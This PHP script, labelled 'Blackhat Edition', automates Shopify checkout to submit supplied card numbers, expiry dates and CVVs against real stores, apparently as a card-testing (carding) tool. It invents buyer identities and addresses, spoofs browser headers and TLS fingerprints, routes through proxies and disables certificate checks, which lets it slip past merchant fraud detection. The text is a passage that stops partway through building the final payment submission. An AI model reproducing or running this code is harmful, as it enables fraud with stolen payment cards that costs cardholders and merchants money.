<?php
// CREDIT: @RASHIK_69 | CHANNEL: @TrickHubBD
// PHP Shopify Checkout API - Blackhat Edition

// ======= CONFIG =======
error_reporting(0);
ini_set('display_errors', 0);
header('Content-Type: application/json');

// ======= HELPERS =======
function randomUserAgent() {
    $agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.2365.92',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 OPR/107.0.0.0'
    ];
    return $agents[array_rand($agents)];
}

function randomName() {
    $first = ['James','John','Robert','Michael','William','David','Mary','Patricia','Jennifer','Linda','Alex','Emma','Chris','Sarah','Mike'];
    $last = ['Smith','Johnson','Williams','Brown','Jones','Garcia','Miller','Davis','Rodriguez','Martinez','Hernandez','Lopez','Wilson','Anderson'];
    return [
        'first' => $first[array_rand($first)],
        'last' => $last[array_rand($last)]
    ];
}

function randomEmail($first, $last) {
    $domains = ['gmail.com','yahoo.com','outlook.com','protonmail.com','hotmail.com','icloud.com'];
    return strtolower($first).'.'.strtolower($last).rand(100,999).'@'.$domains[array_rand($domains)];
}

function randomPhone($country = 'US') {
    $codes = ['US'=>'+1','GB'=>'+44','IN'=>'+91','CA'=>'+1','AU'=>'+61','DE'=>'+49'];
    $code = $codes[$country] ?? '+1';
    return $code.rand(600,999).rand(100,999).rand(1000,9999);
}

function getAddress($url) {
    $default = [
        'address1' => '123 Main St',
        'city' => 'New York',
        'postalCode' => '10001',
        'zoneCode' => 'NY',
        'countryCode' => 'US',
        'phone' => '+12194157586'
    ];
    // Simple country detection from TLD
    $parts = parse_url($url);
    $host = $parts['host'] ?? '';
    $tld = explode('.', $host);
    $tld = end($tld);
    
    $countryMap = [
        'ca' => ['address1'=>'88 Queen St','city'=>'Toronto','postalCode'=>'M5J2J3','zoneCode'=>'ON','countryCode'=>'CA','phone'=>'+14165550198'],
        'uk' => ['address1'=>'221B Baker St','city'=>'London','postalCode'=>'NW1 6XE','zoneCode'=>'LND','countryCode'=>'GB','phone'=>'+442079460123'],
        'in' => ['address1'=>'MG Road','city'=>'Mumbai','postalCode'=>'400001','zoneCode'=>'MH','countryCode'=>'IN','phone'=>'+919876543210'],
        'de' => ['address1'=>'Kurfürstendamm 12','city'=>'Berlin','postalCode'=>'10719','zoneCode'=>'BE','countryCode'=>'DE','phone'=>'+49301234567'],
        'au' => ['address1'=>'1 Martin Place','city'=>'Sydney','postalCode'=>'2000','zoneCode'=>'NSW','countryCode'=>'AU','phone'=>'+61291234567'],
        'ae' => ['address1'=>'Burj Tower','city'=>'Dubai','postalCode'=>'','zoneCode'=>'DU','countryCode'=>'AE','phone'=>'+971501234567'],
    ];
    return $countryMap[strtolower($tld)] ?? $default;
}

function randomTLSFingerprint() {
    $ciphers = [
        'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256',
        'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384',
        'ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305'
    ];
    return $ciphers[array_rand($ciphers)];
}

function httpRequest($url, $method = 'GET', $headers = [], $data = null, $proxy = null, $timeout = 30) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($ch, CURLOPT_HEADER, true);
    
    // Browser fingerprint spoofing
    $userAgent = randomUserAgent();
    $headers['User-Agent'] = $userAgent;
    $headers['Accept'] = $headers['Accept'] ?? 'application/json, text/plain, */*';
    $headers['Accept-Language'] = $headers['Accept-Language'] ?? 'en-US,en;q=0.9';
    $headers['Accept-Encoding'] = 'gzip, deflate, br';
    $headers['Sec-Ch-Ua'] = '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"';
    $headers['Sec-Ch-Ua-Mobile'] = '?0';
    $headers['Sec-Ch-Ua-Platform'] = '"Windows"';
    $headers['Sec-Fetch-Dest'] = 'empty';
    $headers['Sec-Fetch-Mode'] = 'cors';
    $headers['Sec-Fetch-Site'] = 'same-origin';
    $headers['Priority'] = 'u=1, i';
    
    $headerStrings = [];
    foreach ($headers as $key => $val) {
        $headerStrings[] = "$key: $val";
    }
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headerStrings);
    
    if ($method === 'POST') {
        curl_setopt($ch, CURLOPT_POST, true);
        if ($data !== null) {
            if (is_array($data)) {
                $jsonData = json_encode($data);
                curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);
            } else {
                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
            }
        }
    }
    
    // Proxy support
    if ($proxy) {
        curl_setopt($ch, CURLOPT_PROXY, $proxy);
        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
    }
    
    // TLS fingerprint randomization
    curl_setopt($ch, CURLOPT_SSL_CIPHER_LIST, randomTLSFingerprint());
    curl_setopt($ch, CURLOPT_SSLVERSION, CURL_SSLVERSION_TLSv1_3);
    
    $response = curl_exec($ch);
    $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $headers = substr($response, 0, $headerSize);
    $body = substr($response, $headerSize);
    
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    
    if ($error) {
        return ['error' => $error, 'status' => 0];
    }
    
    // Extract cookies
    preg_match_all('/Set-Cookie: (.*?);/i', $headers, $cookies);
    $cookieString = implode('; ', $cookies[1] ?? []);
    
    return [
        'headers' => $headers,
        'body' => $body,
        'status' => $httpCode,
        'cookies' => $cookieString,
        'raw' => $response
    ];
}

function extractJson($text) {
    // Try to find JSON in response
    preg_match('/\{.*\}/s', $text, $matches);
    if (empty($matches)) return null;
    $json = json_decode($matches[0], true);
    if (json_last_error() === JSON_ERROR_NONE) {
        return $json;
    }
    return null;
}

function extractBetween($text, $start, $end) {
    if (strpos($text, $start) === false) return null;
    $startPos = strpos($text, $start) + strlen($start);
    if (strpos($text, $end, $startPos) === false) return null;
    $endPos = strpos($text, $end, $startPos);
    return substr($text, $startPos, $endPos - $startPos);
}

function cleanResponse($message) {
    if (empty($message)) return 'UNKNOWN_ERROR';
    $patterns = [
        '/(PAYMENTS_[A-Z_]+)/',
        '/(CARD_[A-Z_]+)/',
        '/([A-Z]+_[A-Z]+_[A-Z_]+)/',
        '/"code":"([^"]+)"/',
        "/'code':'([^']+)'/"
    ];
    foreach ($patterns as $pattern) {
        if (preg_match($pattern, $message, $matches)) {
            $match = $matches[1] ?? $matches[0];
            if (strpos($match, '_') !== false) return $match;
        }
    }
    return substr($message, 0, 50);
}

// ======= GRAPHQL QUERIES =======
$QUERY_PROPOSAL_SHIPPING = 'query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{target __typename}...on AcceptNewTermViolation{target __typename}...on ConfirmChangeViolation{from to __typename}...on UnprocessableTermViolation{target __typename}...on UnresolvableTermViolation{target __typename}...on ApplyChangeViolation{target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on GenericError{__typename}...on PendingTermViolation{__typename}__typename}}__typename}}';

$QUERY_PROPOSAL_DELIVERY = 'query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{target __typename}...on AcceptNewTermViolation{target __typename}...on ConfirmChangeViolation{from to __typename}...on UnprocessableTermViolation{target __typename}...on UnresolvableTermViolation{target __typename}...on ApplyChangeViolation{target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on GenericError{__typename}...on PendingTermViolation{__typename}__typename}}__typename}}';

$MUTATION_SUBMIT = 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}errors{...on NegotiationError{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{message{code localizedDescription __typename}target __typename}...on AcceptNewTermViolation{message{code localizedDescription __typename}target __typename}...on ConfirmChangeViolation{message{code localizedDescription __typename}from to __typename}...on UnprocessableTermViolation{message{code localizedDescription __typename}target __typename}...on UnresolvableTermViolation{message{code localizedDescription __typename}target __typename}...on ApplyChangeViolation{message{code localizedDescription __typename}target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on InputValidationError{field __typename}...on PendingTermViolation{__typename}__typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken buyerProposal{...BuyerProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}}';

$QUERY_POLL = 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}';

// ======= MAIN PROCESS =======
function processShopify($site, $cc, $mes, $ano, $cvv, $variantId = null, $proxy = null) {
    global $QUERY_PROPOSAL_SHIPPING, $QUERY_PROPOSAL_DELIVERY, $MUTATION_SUBMIT, $QUERY_POLL;
    
    // Format URL
    if (strpos($site, 'http') !== 0) $site = 'https://' . $site;
    $parsed = parse_url($site);
    $domain = $parsed['host'];
    
    // Get random details
    $name = randomName();
    $firstName = $name['first'];
    $lastName = $name['last'];
    $email = randomEmail($firstName, $lastName);
    $address = getAddress($site);
    $phone = randomPhone($address['countryCode']);
    
    // Get variant if not provided
    if (!$variantId) {
        $productUrl = $site . '/products.json';
        $resp = httpRequest($productUrl, 'GET', [], null, $proxy);
        if ($resp['status'] !== 200) {
            return ['status' => false, 'response' => 'Failed to fetch products'];
        }
        $data = json_decode($resp['body'], true);
        if (!$data || empty($data['products'])) {
            return ['status' => false, 'response' => 'No products found'];
        }
        $minPrice = INF;
        $foundVariant = null;
        foreach ($data['products'] as $product) {
            foreach ($product['variants'] as $variant) {
                if (isset($variant['available']) && $variant['available'] === true) {
                    $price = floatval($variant['price']);
                    if ($price < $minPrice) {
                        $minPrice = $price;
                        $foundVariant = $variant['id'];
                    }
                }
            }
        }
        if (!$foundVariant) {
            return ['status' => false, 'response' => 'No available variants'];
        }
        $variantId = $foundVariant;
    }
    
    // ======= STAGE 1: Add to Cart =======
    $cartUrl = $site . '/cart/add.js';
    $cartHeaders = ['Content-Type' => 'application/x-www-form-urlencoded'];
    $cartData = 'id=' . $variantId . '&quantity=1';
    $cartResp = httpRequest($cartUrl, 'POST', $cartHeaders, $cartData, $proxy);
    if ($cartResp['status'] !== 200) {
        return ['status' => false, 'response' => 'Cart add failed: ' . $cartResp['status']];
    }
    
    // ======= STAGE 2: Get Checkout =======
    $checkoutUrl = $site . '/checkout/';
    $checkoutHeaders = ['Accept' => 'text/html,application/xhtml+xml'];
    $checkoutResp = httpRequest($checkoutUrl, 'GET', $checkoutHeaders, null, $proxy, 45);
    $checkoutBody = $checkoutResp['body'];
    $checkoutUrlFinal = $checkoutResp['url'] ?? $checkoutUrl;
    
    // Extract session token
    $sst = $checkoutResp['cookies'];
    preg_match('/sessionToken[^>]+value="([^"]+)"/i', $checkoutBody, $tokenMatch);
    if (empty($tokenMatch)) {
        preg_match('/sessionToken[^>]+value="([^"]+)"/i', $checkoutBody, $tokenMatch);
    }
    if (empty($tokenMatch)) {
        preg_match('/"sessionToken":"([^"]+)"/i', $checkoutBody, $tokenMatch);
    }
    $sessionToken = $tokenMatch[1] ?? null;
    
    if (!$sessionToken) {
        return ['status' => false, 'response' => 'Failed to get session token'];
    }
    
    // Extract other needed data
    preg_match('/queueToken[^:]+"([^"]+)"/i', $checkoutBody, $qMatch);
    $queueToken = $qMatch[1] ?? '';
    
    preg_match('/stableId[^:]+"([^"]+)"/i', $checkoutBody, $sMatch);
    $stableId = $sMatch[1] ?? '1';
    
    // Extract merchant ID
    preg_match('/ProductVariantMerchandise\/(\d+)/', $checkoutBody, $merchMatch);
    $merchId = $merchMatch[1] ?? $variantId;
    
    // Extract currency and subtotal
    preg_match('/currencyCode[^:]+"([^"]+)"/i', $checkoutBody, $currMatch);
    $currency = $currMatch[1] ?? 'USD';
    
    preg_match('/subtotalBeforeTaxesAndShipping[^{]+amount[^"]+"([^"]+)"/i', $checkoutBody, $subMatch);
    $subtotal = $subMatch[1] ?? '0.00';
    if ($subtotal == '0.00') {
        preg_match('/"price":"([^"]+)"/i', $checkoutBody, $priceMatch);
        $subtotal = $priceMatch[1] ?? '0.01';
    }
    
    // ======= STAGE 3: GraphQL - Shipping Proposal =======
    $graphqlUrl = 'https://' . $domain . '/checkouts/unstable/graphql';
    
    $headers = [
        'Content-Type' => 'application/json',
        'Accept' => 'application/json',
        'Shopify-Checkout-Client' => 'checkout-web/1.0',
        'X-Checkout-One-Session-Token' => $sessionToken,
        'Origin' => $site,
        'Referer' => $checkoutUrlFinal
    ];
    
    $variables = [
        'sessionInput' => ['sessionToken' => $sessionToken],
        'queueToken' => $queueToken,
        'discounts' => ['lines' => [], 'acceptUnexpectedDiscounts' => true],
        'delivery' => [
            'deliveryLines' => [[
                'destination' => [
                    'partialStreetAddress' => [
                        'address1' => $address['address1'],
                        'address2' => '',
                        'city' => $address['city'],
                        'countryCode' => $address['countryCode'],
                        'postalCode' => $address['postalCode'],
                        'firstName' => $firstName,
                        'lastName' => $lastName,
                        'zoneCode' => $address['zoneCode'],
                        'phone' => $phone
                    ]
                ],
                'selectedDeliveryStrategy' => [
                    'deliveryStrategyMatchingConditions' => [
                        'estimatedTimeInTransit' => ['any' => true],
                        'shipments' => ['any' => true]
                    ],
                    'options' => []
                ],
                'targetMerchandiseLines' => ['any' => true],
                'deliveryMethodTypes' => ['SHIPPING'],
                'expectedTotalPrice' => ['any' => true],
                'destinationChanged' => true
            ]],
            'noDeliveryRequired' => [],
            'useProgressiveRates' => false,
            'prefetchShippingRatesStrategy' => null,
            'supportsSplitShipping' => true
        ],
        'merchandise' => [
            'merchandiseLines' => [[
                'stableId' => $stableId,
                'merchandise' => [
                    'productVariantReference' => [
                        'id' => 'gid://shopify/ProductVariantMerchandise/' . $merchId,
                        'variantId' => 'gid://shopify/ProductVariant/' . $variantId,
                        'properties' => [],
                        'sellingPlanId' => null,
                        'sellingPlanDigest' => null
                    ]
                ],
                'quantity' => ['items' => ['value' => 1]],
                'expectedTotalPrice' => [
                    'value' => ['amount' => $subtotal, 'currencyCode' => $currency]
                ],
                'lineComponentsSource' => null,
                'lineComponents' => []
            ]]
        ],
        'payment' => [
            'totalAmount' => ['any' => true],
            'paymentLines' => [],
            'billingAddress' => [
                'streetAddress' => [
                    'address1' => '',
                    'city' => '',
                    'countryCode' => $address['countryCode'],
                    'lastName' => '',
                    'zoneCode' => 'ENG',
                    'phone' => ''
                ]
            ]
        ],
        'buyerIdentity' => [
            'customer' => ['presentmentCurrency' => $currency, 'countryCode' => $address['countryCode']],
            'email' => $email,
            'emailChanged' => false,
            'phoneCountryCode' => $address['countryCode'],
            'marketingConsent' => [['email' => ['value' => $email]]],
            'shopPayOptInPhone' => ['countryCode' => $address['countryCode']],
            'rememberMe' => false
        ],
        'tip' => ['tipLines' => []],
        'taxes' => [
            'proposedAllocations' => null,
            'proposedTotalAmount' => ['value' => ['amount' => '0', 'currencyCode' => $currency]],
            'proposedTotalIncludedAmount' => null,
            'proposedMixedStateTotalAmount' => null,
            'proposedExemptions' => []
        ],
        'note' => ['message' => null, 'customAttributes' => []],
        'localizationExtension' => ['fields' => []],
        'nonNegotiableTerms' => null,
        'scriptFingerprint' => [
            'signature' => null,
            'signatureUuid' => null,
            'lineItemScriptChanges' => [],
            'paymentScriptChanges' => [],
            'shippingScriptChanges' => []
        ],
        'optionalDuties' => ['buyerRefusesDuties' => false]
    ];
    
    $payload = [
        'query' => $QUERY_PROPOSAL_SHIPPING,
        'variables' => $variables,
        'operationName' => 'Proposal'
    ];
    
    $resp = httpRequest($graphqlUrl, 'POST', $headers, $payload, $proxy);
    if ($resp['status'] !== 200) {
        return ['status' => false, 'response' => 'GraphQL shipping proposal failed: ' . $resp['status']];
    }
    
    $data = json_decode($resp['body'], true);
    if (isset($data['errors'])) {
        return ['status' => false, 'response' => 'GraphQL Error: ' . json_encode($data['errors'])];
    }
    
    // Extract shipping info
    $sellerProposal = $data['data']['session']['negotiate']['result']['sellerProposal'] ?? null;
    if (!$sellerProposal) {
        return ['status' => false, 'response' => 'No seller proposal'];
    }
    
    // Get shipping amount and strategy
    $shippingAmount = '0.00';
    $deliveryStrategy = '';
    $deliveryData = $sellerProposal['delivery'] ?? [];
    if ($deliveryData && isset($deliveryData['deliveryLines'][0]['availableDeliveryStrategies'][0])) {
        $strategy = $deliveryData['deliveryLines'][0]['availableDeliveryStrategies'][0];
        $deliveryStrategy = $strategy['handle'] ?? '';
        $shippingAmount = $strategy['amount']['value']['amount'] ?? '0.00';
    }
    
    // Get tax amount
    $taxAmount = '0.00';
    $taxData = $sellerProposal['tax'] ?? [];
    if ($taxData && isset($taxData['totalTaxAmount']['value']['amount'])) {
        $taxAmount = $taxData['totalTaxAmount']['value']['amount'];
    }
    
    // Get running total
    $runningTotal = $sellerProposal['runningTotal']['value']['amount'] ?? '0.00';
    $totalPrice = floatval($runningTotal) + floatval($shippingAmount) + floatval($taxAmount);
    
    // Get payment method
    $paymentIdentifier = null;
    $gateway = 'UNKNOWN';
    $paymentData = $sellerProposal['payment'] ?? [];
    if ($paymentData && isset($paymentData['availablePaymentLines'])) {
        foreach ($paymentData['availablePaymentLines'] as $line) {
            $method = $line['paymentMethod'] ?? [];
            if (isset($method['paymentMethodIdentifier'])) {
                $paymentIdentifier = $method['paymentMethodIdentifier'];
                $gateway = $method['extensibilityDisplayName'] ?? $method['name'] ?? 'UNKNOWN';
                break;
            }
        }
    }
    
    if (!$paymentIdentifier) {
        return ['status' => false, 'response' => 'No payment method available'];
    }
    
    // ======= STAGE 4: GraphQL - Delivery Proposal =======
    $variables['delivery']['deliveryLines'][0]['selectedDeliveryStrategy'] = [
        'deliveryStrategyByHandle' => [
            'handle' => $deliveryStrategy,
            'customDeliveryRate' => false
        ],
        'options' => []
    ];
    $variables['delivery']['deliveryLines'][0]['targetMerchandiseLines'] = [
        'lines' => [['stableId' => $stableId]]
    ];
    $variables['delivery']['deliveryLines'][0]['expectedTotalPrice'] = [
        'value' => ['amount' => $shippingAmount, 'currencyCode' => $currency]
    ];
    $variables['delivery']['deliveryLines'][0]['destinationChanged'] = false;
    $variables['payment']['billingAddress'] = [
        'streetAddress' => [
            'address1' => $address['address1'],
            'address2' => '',
            'city' => $address['city'],
            'countryCode' => $address['countryCode'],
            'postalCode' => $address['postalCode'],
            'firstName' => $firstName,
            'lastName' => $lastName,
            'zoneCode' => $address['zoneCode'],
            'phone' => $phone
        ]
    ];
    $variables['taxes']['proposedTotalAmount']['value']['amount'] = $taxAmount;
    $variables['buyerIdentity']['shopPayOptInPhone']['number'] = $phone;
    
    $payload = [
        'query' => $QUERY_PROPOSAL_DELIVERY,
        'variables' => $variables,
        'operationName' => 'Proposal'
    ];
    
    $resp = httpRequest($graphqlUrl, 'POST', $headers, $payload, $proxy);
    if ($resp['status'] !== 200) {
        return ['status' => false, 'response' => 'GraphQL delivery proposal failed: ' . $resp['status']];
    }
    // Parse delivery response (just validate)
    $deliveryData = json_decode($resp['body'], true);
    if (isset($deliveryData['errors'])) {
        return ['status' => false, 'response' => 'Delivery GraphQL Error'];
    }
    
    // ======= STAGE 5: Tokenize Card =======
    $tokenPayload = [
        'credit_card' => [
            'number' => $cc,
            'month' => intval($mes),
            'year' => intval($ano),
            'verification_value' => $cvv,
            'start_month' => null,
            'start_year' => null,
            'issue_number' => '',
            'name' => $firstName . ' ' . $lastName
        ],
        'payment_session_scope' => $domain
    ];
    
    $tokenHeaders = [
        'Content-Type' => 'application/json',
        'Accept' => 'application/json',
        'Origin' => 'https://checkout.pci.shopifyinc.com',
        'Referer' => 'https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html'
    ];
    
    $tokenResp = httpRequest('https://checkout.pci.shopifyinc.com/sessions', 'POST', $tokenHeaders, $tokenPayload, $proxy);
    if ($tokenResp['status'] !== 200) {
        return ['status' => false, 'response' => 'Tokenization failed: ' . $tokenResp['status']];
    }
    $tokenData = json_decode($tokenResp['body'], true);
    $token = $tokenData['id'] ?? null;
    if (!$token) {
        return ['status' => false, 'response' => 'Failed to get payment token'];
    }
    
    // ======= STAGE 6: Submit for Completion =======
    $submitVariables = [
        'input' => [
            'sessionInput' => ['sessionToken' => $sessionToken],
            'queueToken' => $queueToken,
            'discounts' => ['lines' => [], 'acceptUnexpectedDiscounts' => true],
            'delivery' => [
                'deliveryLines' => [[
                    'destination' => [
                        'streetAddress' => [
                            'address1' => $address['address1'],
                            'address2' => '',
                            'city' => $address['city'],
                            'countryCode' => $address['countryCode'],
                            'postalCode' => $address['postalCode'],
                            'firstName' => $firstName,
                            'lastName' => $lastName,
                            'zoneCode' => $address['zoneCode'],
                            'phone' => $phone
                        ]
                    ],
                    'selectedDeliveryStrategy' => [
                        'deliveryStrategyByHandle' => [
                            'handle' => $deliveryStrategy,
                            'customDeliveryRate' => false
                        ],
                        'options' => ['phone' => $phone]
                    ],
                    'targetMerchandiseLines' => [
                        'lines' => [['stableId' => $stableId]]
                    ],
                    'deliveryMethodTypes' => ['SHIPPING'],
                    'expectedTotalPrice' => [
                        'value' => ['amount' => $shippingAmount, 'currencyCode' => $currency]
                    ],
                    'destinationChanged' => false
                ]],
                'noDeliveryRequired' => [],
                'useProgressiveRates' => true,
                'prefetchShippingRatesStrategy' => null,
                'supportsSplitShipping' => true
            ],
            'merchandise' => [
                'merchandiseLines' => [[
                    'stableId' => $stableId,
                    'merchandise' => [
                        'productVariantReference' => [
                            'id' => 'gid://shopify/ProductVariantMerchandise/' . $merchId,
                            'variantId' => 'gid://shopify/ProductVariant/' . $variantId,
                            'properties' => [],
                            'sellingPlanId' => null,
                            'sellingPlanDigest' => null
                        ]
                    ],
                    'quantity' => ['items' => ['value' => 1]],
                    'expectedTotalPrice' => [
                        'value' => ['amount' => $subtotal, 'currencyCode' => $currency]
                    ],
                    'lineComponentsSource' => null,
                    'lineComponents' => []
                ]]
            ],
            'payment' => [
                'totalAmount' => ['any' => true],
                'paymentLines' => [[
                    'paymentMethod' => [
                        'directPaymentMethod' => [
                            'paymentMethodIdentifier' => $paymentIdentifier,
                            'sessionId' => $token,
                            'billingAddress' => [
                                'streetAddress' => [
                                    'address1' => $address['address1'],
                                    'address2' => '',
                                    'city' => $address['city'],
                                    'countryCode' => $address['countryCode'],
                                    'postalCode' => $address['postalCode'],
                                    'firstName' => $firstName,
                                    'lastName' => $lastName,
                                    'zoneCode' => $address['zoneCode'],
                                    'phone' => $phone
                                ]
                            ],
                            'cardSource' => null
                        ]
                    ],
                    'amount' => [
                        'value' => ['amount' => $runningTotal, 'currencyCode' => $currency]
                    ],
                    'dueAt' => null
                ]],
                'billingAddress' => [
                    'streetAddress' => [
                        'address1' => $address['address1'],
                        'address2' => '',
                        'city' => $address['city'],
                        'countryCode' => $address['countryCode'],
                        'postalCode' => $address['postalCode'],
                        'firstName' => $firstName,
                        'lastName' => $lastName,
                        'zoneCode' => $address['zoneCode'],
                        'phone' => $phone
                    ]
                ]
            ],
            'buyerIdentity' => [
                'customer' => ['presentmentCurrency' => $currency, 'countryCode' => $address['countryCode']],
                'email' => $email,
                'emailChanged' => false,
                'phoneCountryCode' => $address['countryCode'],
                'marketingConsent' => [['email' => ['value' => $email]]],
                'shopPayOptInPhone' => ['number' => $phone, 'countryCode' => $address['countryCode']],
                'rememberMe' => false
            ],
            'taxes' => [
                'proposedAllocations' => null,
                'proposedTotalAmount' => [
                    'value' => ['amount' => $taxAmount, 'currencyCode' => $currency]
                ],
                'proposedTotalIncludedAmount' => null,
                'proposedMixedStateTotalAmount' => null,
